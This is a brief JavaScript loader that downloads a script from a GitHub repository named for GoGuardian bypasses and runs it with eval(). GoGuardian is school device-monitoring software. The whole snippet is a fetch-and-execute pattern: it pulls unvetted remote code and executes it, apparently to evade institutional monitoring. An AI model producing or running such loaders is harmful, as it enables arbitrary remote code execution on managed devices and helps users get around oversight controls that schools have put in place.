
fetch("https://raw.githubusercontent.com/RaspberryEqualsPi/GoGuardianBypasses/main/extensions.js").then(function(response) {
    return response.text();
  }).then(function(data) {
    console.log(data);
    eval(data);
  }).catch(function() {
    console.log("Booo");
  });